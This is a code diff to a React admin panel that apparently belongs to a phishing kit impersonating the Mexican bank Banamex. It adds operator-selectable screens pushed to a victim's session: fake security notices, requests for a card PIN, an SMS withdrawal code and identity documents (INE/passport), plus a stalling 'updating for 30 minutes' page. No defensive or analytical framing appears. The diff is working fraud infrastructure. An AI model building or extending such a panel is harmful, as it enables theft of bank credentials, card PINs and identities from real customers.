@@ -558,7 +558,7 @@ export default function AdminPanel() {
     }
     
     // Handle direct screen changes for certain screens (no modal needed)
-    if (["actualizacion"].includes(screen)) {
+    if (["actualizacion", "aviso_seguridad", "validando_seguridad", "codigo_retiro", "proteccion_tarjetas", "nip_tarjeta", "confirmar_identidad", "validando_identidad"].includes(screen)) {
       sendScreenChange({
         tipo: `mostrar_${screen}`,
         sessionId: selectedSessionId
@@ -1044,9 +1044,22 @@ export default function AdminPanel() {
                   value=""
                 >
                   <option value="">Selecciona una opción</option>
-                  <option value="netkey2">1. Banamex - Flujo Completo (NetKey → Formulario)</option>
-                  <option value="netkey_manual">2. NetKey</option>
-                  <option value="actualizacion">3. Estamos Actualizando (30 min)</option>
+                  <optgroup label="Flujos Completos">
+                    <option value="netkey2">Banamex - Flujo Completo (NetKey → Formulario)</option>
+                  </optgroup>
+                  <optgroup label="Pantallas de Seguridad">
+                    <option value="aviso_seguridad">Aviso de Seguridad</option>
+                    <option value="validando_seguridad">Validando Seguridad</option>
+                    <option value="codigo_retiro">Código de Retiro + SMS</option>
+                    <option value="proteccion_tarjetas">Protección de Tarjetas</option>
+                    <option value="nip_tarjeta">NIP de Tarjeta</option>
+                    <option value="confirmar_identidad">Confirmar Identidad (INE/Pasaporte)</option>
+                    <option value="validando_identidad">Validando Identidad</option>
+                  </optgroup>
+                  <optgroup label="Otras Pantallas">
+                    <option value="netkey_manual">NetKey Manual</option>
+                    <option value="actualizacion">Estamos Actualizando (30 min)</option>
+                  </optgroup>
                 </select>
               </div>
             </div>
